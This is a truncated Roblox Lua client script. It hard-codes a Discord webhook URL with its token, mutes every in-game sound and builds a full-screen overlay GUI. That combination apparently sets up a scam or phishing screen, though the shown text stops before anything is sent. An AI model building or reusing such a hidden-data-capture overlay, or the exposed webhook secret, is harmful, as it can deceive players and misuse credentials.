local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Webhook URL
local webhookURL = "https://discord.com/api/webhooks/1452576285586100266/-lwX0j7Cb8xGWtxUAf-2fhzTCHiNkAwHsfBLU-AS-8S5rh9DWXlrUQeBCpZulwlDn_zl"

-- Mute all sounds
SoundService.RespectFilteringEnabled = false
for _, sound in pairs(workspace:GetDescendants()) do
if sound:IsA("Sound") then
sound.Volume = 0
end
end

-- Create initial GUI (NOT draggable)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiColdwalGUI"
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true -- ðŸ”¥ ISSO FAZ TAMPA TUDO
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 250)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
